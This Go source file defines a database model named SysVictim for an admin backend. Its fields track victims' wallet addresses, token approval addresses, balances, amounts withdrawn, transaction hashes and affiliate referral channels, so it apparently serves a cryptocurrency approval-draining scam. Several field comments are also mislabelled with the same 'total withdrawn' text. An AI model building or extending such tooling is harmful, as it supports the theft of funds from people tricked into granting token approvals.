package system

import (
	"github.com/flipped-aurora/gin-vue-admin/server/global"
)

type SysVictim struct {
	global.GVA_MODEL
	CustomerAddress string `json:"customerAddress" gorm:"comment:客户地址"` // 客户地址
	ApprovalAddress string `json:"approvalAddress" gorm:"comment:授权地址"` // 授权地址
	//ToAddress        string `json:"to_address" gorm:"comment:到账地址"`        // 到账地址
	Network          string `json:"network" gorm:"comment:区块链网络类型"`       // 区块链网络类型
	Token            string `json:"token" gorm:"comment:币种类型"`            // 币种类型
	Desc             string `json:"desc" gorm:"comment:备注"`               // 备注
	Balance          string `json:"balance" gorm:"comment:余额"`            // 余额
	WithdrawAmount   string `json:"withdrawAmount" gorm:"comment:提币总量"`   // 提币总量
	Status           uint   `json:"status" gorm:"comment:提币总量"`           // 状态
	Refresh          uint   `json:"refresh" gorm:"comment:提币总量"`          // 刷新次数
	TxHash           string `json:"tx_hash" gorm:"comment:提币总量"`          // 交易hash
	PrimaryChannel   string `json:"primaryChannel" gorm:"comment:一级渠道"`   // 一级渠道
	SecondaryChannel string `json:"secondaryChannel" gorm:"comment:二级渠道"` // 二级渠道
}

func (SysVictim) TableName() string {
	return "sys_victims"
}
